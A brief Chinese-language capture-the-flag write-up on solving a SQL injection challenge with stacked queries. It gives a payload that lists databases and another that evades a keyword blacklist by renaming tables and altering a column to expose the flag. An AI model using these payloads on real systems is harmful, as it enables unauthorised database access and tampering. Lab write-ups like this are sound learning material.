只能说：sql注入之路道阻且长：

开始试了一下普通的sql注入中的union注入、盲注都不行：

于是查看题解了；发现是堆叠注入；

输入下列指令查看sql数据库名：

```sql
1'; show databases;#
```

注意1后面要有',把这个语句闭合后可以输入新的语句（stack injection）

然后发现有过滤return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);

过滤了select 、update、delete、drop、insert、where

于是可以用rename、和alter语句来搞事：

```sql
1';rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#
```

